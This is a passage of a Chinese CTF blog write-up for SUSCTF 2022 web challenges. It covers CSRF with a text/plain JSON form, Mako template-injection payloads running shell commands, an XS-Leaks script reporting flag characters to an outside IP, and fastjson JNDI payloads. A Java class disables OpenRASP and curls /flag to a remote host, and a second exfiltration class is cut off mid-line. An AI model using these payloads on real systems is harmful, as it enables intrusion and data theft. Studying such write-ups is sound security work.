@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Fxxkdors利用csrf获取admin权限 附件中的js文件内容是用puppeteer去模拟浏览器登录，然后访问我们给定的链接 robot会先用admin权限登陆后点击我们提交的恶意网址,从而自动提交恶意表单完成攻击 bp抓到关键http包如下 1234567891011121314151617POST &#x2F;changeapi.php HTTP&#x2F;1.1Host: localhost:10002U">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUSCTF2022WEB">
+<meta property="og:url" content="https://tefuir72.github.io/2022/03/02/2022030209/index.html">
+<meta property="og:site_name" content="TeFuir&#39;Blog">
+<meta property="og:description" content="Fxxkdors利用csrf获取admin权限 附件中的js文件内容是用puppeteer去模拟浏览器登录，然后访问我们给定的链接 robot会先用admin权限登陆后点击我们提交的恶意网址,从而自动提交恶意表单完成攻击 bp抓到关键http包如下 1234567891011121314151617POST &#x2F;changeapi.php HTTP&#x2F;1.1Host: localhost:10002U">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://tefuir72.github.io/2022/03/02/2022030209/2022030209/image-20220302202736931.png">
+<meta property="og:image" content="https://tefuir72.github.io/2022/03/02/2022030209/2022030209/image-20220303111549244.png">
+<meta property="og:image" content="https://tefuir72.github.io/2022/03/02/2022030209/2022030209/image-20220303112324390.png">
+<meta property="article:published_time" content="2022-03-02T01:29:12.000Z">
+<meta property="article:modified_time" content="2022-03-20T06:19:32.863Z">
+<meta property="article:author" content="Te Fuir">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tefuir72.github.io/2022/03/02/2022030209/2022030209/image-20220302202736931.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>SUSCTF2022WEB</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post " href="/2022/03/12/2022031221/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/2021/12/26/2021122621/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tefuir72.github.io/2022/03/02/2022030209/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tefuir72.github.io/2022/03/02/2022030209/&text=SUSCTF2022WEB"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tefuir72.github.io/2022/03/02/2022030209/&title=SUSCTF2022WEB"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tefuir72.github.io/2022/03/02/2022030209/&is_video=false&description=SUSCTF2022WEB"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SUSCTF2022WEB&body=Check out this article: https://tefuir72.github.io/2022/03/02/2022030209/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tefuir72.github.io/2022/03/02/2022030209/&title=SUSCTF2022WEB"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tefuir72.github.io/2022/03/02/2022030209/&title=SUSCTF2022WEB"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tefuir72.github.io/2022/03/02/2022030209/&title=SUSCTF2022WEB"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tefuir72.github.io/2022/03/02/2022030209/&title=SUSCTF2022WEB"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tefuir72.github.io/2022/03/02/2022030209/&name=SUSCTF2022WEB&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://tefuir72.github.io/2022/03/02/2022030209/&t=SUSCTF2022WEB"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fxxkdors"><span class="toc-number">1.</span> <span class="toc-text">Fxxkdors</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTML-practice"><span class="toc-number">2.</span> <span class="toc-text">HTML_practice</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-note"><span class="toc-number">3.</span> <span class="toc-text">ez_note</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rubbish-maker"><span class="toc-number">4.</span> <span class="toc-text">rubbish maker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-gadget-v1-0-and-revenge"><span class="toc-number">5.</span> <span class="toc-text">baby gadget v1.0 and revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-gadget-v2-0-and-revenge"><span class="toc-number">6.</span> <span class="toc-text">baby gadget v2.0 and revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WP"><span class="toc-number">7.</span> <span class="toc-text">WP</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        SUSCTF2022WEB
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Te Fuir</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-02T01:29:12.000Z" itemprop="datePublished">2022-03-02</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Fxxkdors"><a href="#Fxxkdors" class="headerlink" title="Fxxkdors"></a>Fxxkdors</h2><p>利用csrf获取admin权限</p>
+<p>附件中的js文件内容是用puppeteer去模拟浏览器登录，然后访问我们给定的链接</p>
+<p>robot会先用admin权限登陆后点击我们提交的恶意网址,从而自动提交恶意表单完成攻击</p>
+<p>bp抓到关键http包如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /changeapi.php HTTP/1.1</span><br><span class="line">Host: localhost:10002</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 18</span><br><span class="line">Origin: http://localhost:10002</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost:10002/change.php</span><br><span class="line">Cookie: PHPSESSID=6a1c7378948498b4bed170d212bac7ee; __tins__713776=%7B%22sid%22%3A%201619663076391%2C%20%22vd%22%3A%208%2C%20%22expires%22%3A%201619665600834%7D; __51cke__=; __51laig__=12; _csrf=3067fb78f9b1447deb7a6307b8d9fa8fe35a0d13fefa00fe1c90ba7513aa9e08a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%224QLk0PKtqpkSXhwRmTv5HBysJPEuE2zl%22%3B%7D; __tins__17754207=%7B%22sid%22%3A%201624533245364%2C%20%22vd%22%3A%204%2C%20%22expires%22%3A%201624535118910%7D; isvipretainend=; vipPromorunningtmr=; discount_free_trigger=; token=s%3Aj%3A%7B%22id%22%3A1%2C%22username%22%3A%22tefuir%22%2C%22password%22%3A%22this_is_password%22%7D.SdGCWHkxHMFX8LEOhXG2%2FZR6UwoxLbXmh%2FxdcI%2FWq0s; lg=cn; PbootSystem=bpvv29memg47vqoe3jmv62tjdp; session=5243527576976910940%7ChrQTOaK93YFVBrjGnVzRrngHQNZQIRah30IP9aGRTOuSoeGDZ.FEixAK6PshBIiQ5ovaqlbP3gljneaCnu8AC1</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用bp生成csrf的poc</p>
+<p><img src="2022030209/image-20220302202736931.png" alt="image-20220302202736931"></p>
+<p>发送json格式会出现同源策略问题无法发起请求，可以通过使Content-Type: text/plain，然后body中是json数据就能绕过</p>
+<p>将原始poc更改下,如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//steal.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:10002/changeapi.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;text/plain&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&#x27;&#123;&quot;username&quot;: &quot;july&quot;, &quot;trash&quot;: &quot;&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;july&quot;&#125;&#x27;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload = <span class="function">() =&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript">    csrf.submit();</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当robot打开该html时会向<code>http://localhost:10002/changeapi.php</code>提交一个内容为<code>&#123;&quot;username&quot;:&quot;july&quot;, &quot;trash&quot;:&quot;=july&quot;&#125;</code>的json数据包,从而完成用admin权限提升普通用户july到可以查看flag的权限</p>
+<blockquote>
+<p>具体看以下文档</p>
+<p><a target="_blank" rel="noopener" href="https://systemoverlord.com/2016/08/24/posting-json-with-an-html-form.html">https://systemoverlord.com/2016/08/24/posting-json-with-an-html-form.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.azuki.vip/csrf/">https://blog.azuki.vip/csrf/</a></p>
+</blockquote>
+<h2 id="HTML-practice"><a href="#HTML-practice" class="headerlink" title="HTML_practice"></a>HTML_practice</h2><p>python的mako库模板注入</p>
+<p>判断参考</p>
+<p><img src="2022030209/image-20220303111549244.png" alt="image-20220303111549244"></p>
+<blockquote>
+<p>mako判断ssti也还有</p>
+<p>%字符导致服务器错误</p>
+<p>##导致页面内容被注释</p>
+<p><a target="_blank" rel="noopener" href="https://docs.makotemplates.org/en/latest/syntax.html#exiting-early-from-a-template">mako文档</a></p>
+</blockquote>
+<p>关于mako的ssti</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 第一种</span><br><span class="line">&lt;%</span><br><span class="line">import os</span><br><span class="line">x=os.popen(name).read()</span><br><span class="line">%&gt;</span><br><span class="line">$&#123;x&#125;</span><br><span class="line"></span><br><span class="line">// 第二种</span><br><span class="line">% for a in (self.module.cache.util.os.system(name),2,3):</span><br><span class="line">    1</span><br><span class="line">% endfor</span><br><span class="line"></span><br><span class="line">// 第三种</span><br><span class="line">%while self.context.writer()(ₑval(name))==0:</span><br><span class="line">%endwhile</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=str(__import__(%27os%27).popen(%27ls/%27).read())</span><br><span class="line">?name=str(__import__(%27os%27).popen(%27cat%20/flag%27).read())</span><br></pre></td></tr></table></figure>
+
+
+
+<p>成功命令执行</p>
+<p><img src="2022030209/image-20220303112324390.png" alt="image-20220303112324390"></p>
+<blockquote>
+<p>关于更多的mako模板注入参考 <a target="_blank" rel="noopener" href="https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/">mako-ssti</a></p>
+</blockquote>
+<h2 id="ez-note"><a href="#ez-note" class="headerlink" title="ez_note"></a>ez_note</h2><p>跳转类型的 XS-Leaks, 当查询flag的前几个字符正确时会进行跳转, 并且浏览器历史列表元素有三个</p>
+<blockquote>
+<p>poc中部分函数用法:</p>
+<p>setTimeout() 方法用于在指定的毫秒数后调用函数或计算表达式</p>
+<p>fetch()方法定义在<code>Window</code>对象以及<code>WorkerGlobalScope</code>对象上，用于发起获取资源的请求，其返回一个<code>Promise</code>对象，这个<code>Promise</code>对象会在请求响应后被<code>resolve</code>，并传回<code>Response</code>对象</p>
+<p>window的<em>open(</em>)方法用于导航到一个特定的URL或者打开一个新的浏览器窗口</p>
+<p>history.length声明了浏览器历史列表中的元素数量,用来检测是否发生了重定向</p>
+<p>win.location获取当前页面地址（URL）并把浏览器重定向到新页面</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// poc.html</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;body onload=exp()&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function exp()&#123;</span><br><span class="line">        let charset = &quot;1234567890_qwertyuiopasdfghjklzxcvbnm&quot;</span><br><span class="line">        for(let c of charset)&#123;</span><br><span class="line">            test(c)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function test(c) &#123;</span><br><span class="line">        let win = open(&quot;http://123.60.29.171:10001/search?q=SUSCTF&#123;&quot;+ c )</span><br><span class="line"></span><br><span class="line">        setTimeout(()=&gt;&#123;win.location=&quot;http://106.15.53.153&quot;&#125;, 2000)</span><br><span class="line">        setTimeout(()=&gt;&#123;</span><br><span class="line">            console.log(c)</span><br><span class="line">            console.log(win.history.length)</span><br><span class="line">            if(win.history.length === 3)</span><br><span class="line">            &#123;</span><br><span class="line">                fetch(&quot;http://106.15.53.153:10000/?&quot; + c)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, 4000)</span><br><span class="line">        setTimeout(()=&gt;&#123;</span><br><span class="line">            win.close()</span><br><span class="line">        &#125;, 5000)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://xsleaks.dev/docs/attacks/navigations/">XS-Leak</a></p>
+</blockquote>
+<h2 id="rubbish-maker"><a href="#rubbish-maker" class="headerlink" title="rubbish maker"></a>rubbish maker</h2><p><a target="_blank" rel="noopener" href="http://tttang.com/archive/1454/">http://tttang.com/archive/1454/</a></p>
+<h2 id="baby-gadget-v1-0-and-revenge"><a href="#baby-gadget-v1-0-and-revenge" class="headerlink" title="baby gadget v1.0 and revenge"></a>baby gadget v1.0 and revenge</h2><p><code>/;/admin</code> 可以绕过登录</p>
+<p>jar包搜索</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime.exec/ProcessBuilder/ProcessImpl</span><br><span class="line">lookup(</span><br></pre></td></tr></table></figure>
+
+<p>测试dnslog</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;abc&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;@type&quot;:&quot;org.quartz.impl.jdbcjobstore.JTANonClusteredSemaphore&quot;,&quot;transactionManagerJNDIName&quot;:&quot;rmi://192.168.0.105:1090/ldtnpi&quot; &#125;,&#123;&quot;$ref&quot;:&quot;$[0].transaction&quot;&#125;]</span><br></pre></td></tr></table></figure>
+
+<p>直接发送会被拦截,过滤了\x,使用\u绕过</p>
+<p>直接回显执行命令可以看到有 rasp，那么直接 forkandexec 绕过 rasp</p>
+<blockquote>
+<p>直接反射UNIXProcess/ProcessImpl的forkAndExec方法</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45449318/article/details/120031661">https://blog.csdn.net/qq_45449318/article/details/120031661</a></p>
+<p><a target="_blank" rel="noopener" href="http://t.zoukankan.com/sup3rman-p-15489975.html">http://t.zoukankan.com/sup3rman-p-15489975.html</a></p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Evil.java</span></span><br><span class="line"><span class="keyword">package</span> exec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.ProcessBuilder.Redirect;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProcessImplExec</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String[] cmds = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;;</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        Method method = clazz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class, Map.class, String.class, Redirect[].class, <span class="keyword">boolean</span>.class);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Process e = (Process) method.invoke(<span class="keyword">null</span>, cmds, <span class="keyword">null</span>, <span class="string">&quot;.&quot;</span>, <span class="keyword">null</span>, <span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] bs = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        <span class="keyword">int</span> readSize = <span class="number">0</span>;</span><br><span class="line">        ByteArrayOutputStream infoStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">while</span> ((readSize = e.getInputStream().read(bs)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            infoStream.write(bs, <span class="number">0</span>, readSize);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(infoStream.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>至于关闭rasp</p>
+<blockquote>
+<p>openrasp使用<code>javaagent</code> 机制来实现。在服务器启动时，可动态的修改Java字节码，实际上是注入到了内存中的，可以利用反射来修改配置信息，实现关闭rasp.</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Evil.java</span></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; clz = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;com.baidu.openrasp.config.Config&quot;</span>);</span><br><span class="line">            java.lang.reflect.Method getConfig = clz.getDeclaredMethod(<span class="string">&quot;getConfig&quot;</span>);</span><br><span class="line">            java.lang.reflect.Field disableHooks = clz.getDeclaredField(<span class="string">&quot;disableHooks&quot;</span>);</span><br><span class="line">            disableHooks.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object ins = getConfig.invoke(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            disableHooks.set(ins,<span class="keyword">true</span>);</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;curl http://121.5.169.223:39454 -F file=@/flag&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>其次jar 包有个 xbean 的依赖,可以用公开poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;ldap://121.5.169.223:39543/Evil&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>另一个解法</p>
+<p>url外带</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Evil.java</span></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        String str;</span><br><span class="line">        </span><br><span class="line">        BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(<span class="string">&quot;/flag&quot;</span>));</span><br><span class="line">        <span class="keyword">while</span> ((str = 